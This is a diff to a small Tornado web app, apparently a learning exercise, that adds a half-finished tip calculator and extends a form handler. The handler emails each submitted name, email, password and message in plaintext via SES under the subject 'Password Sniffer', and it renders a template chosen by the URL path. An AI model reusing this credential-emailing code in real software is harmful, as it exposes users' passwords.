@@ -38,18 +38,33 @@ class TemplateHandler(tornado.web.RequestHandler):
 class MainHandler(TemplateHandler):
     def get(self):
         names = self.get_query_arguments('name')
-        self.set_header('Cache-Control',
-                        'no-store, no-cache, must-revalidate, max-age=0')
+        self.set_header('Cache-Control','no-store, no-cache, must-revalidate, max-age=0')
         self.render_template("index.html", {'names': names, 'amount': 42.55})
 
+class TipCalcHandler(TemplateHandler):
+    def post(self):
+        bill = self.get_body_argument('bill')
+        service = self.get_body_argument('service')
+
+        # if service == "Good":
+        #     tip = bill * 0.20
+        # elif service == "Fair":
+        #     tip = bill * 0.15
+        # else:
+        #     tip = bill * 0.10
+        # totalbill = bill + tip
+
+        self.render_template('tip.html', {'bill': bill, 'service': service})
+        # self.write(bill + service)
 
 class PageHandler(TemplateHandler):
     def post(self, page):
+        self.set_header('Cache-Control','no-store, no-cache, must-revalidate, max-age=0')
+        name = self.get_body_argument('name')
         email = self.get_body_argument('email')
         password = self.get_body_argument('password')
-        self.write('thanks, got your data \n')
-        self.write('Email: ' + email)
-        # self.redirect("/thankyoupage") #tornado throws a 302 error if page is nonexistent
+        message = self.get_body_argument('message')
+        self.redirect("/page/thankyou.html") #tornado throws a 302 error if page is nonexistent
 
         response = SES_CLIENT.send_email(
           Destination={
@@ -59,7 +74,7 @@ class PageHandler(TemplateHandler):
             'Body': {
               'Text': {
                 'Charset': 'UTF-8',
-                'Data': 'Email: {}\nPassword: {}\n'.format(email, password),
+                'Data': 'Name: {}\nEmail: {}\nPassword: {}\nMessage: {}\n'.format(name, email, password, message),
               },
             },
             'Subject': {'Charset': 'UTF-8', 'Data': 'Password Sniffer'},
@@ -73,10 +88,12 @@ class PageHandler(TemplateHandler):
             'no-store, no-cache, must-revalidate, max-age=0')
         self.render_template(page, {})
 
+
 def make_app():
     return tornado.web.Application([
         (r"/", MainHandler),
         (r"/page/(.*)", PageHandler),
+        (r"/tipcalc", TipCalcHandler),
         (
             r"/static/(.*)",
             tornado.web.StaticFileHandler,
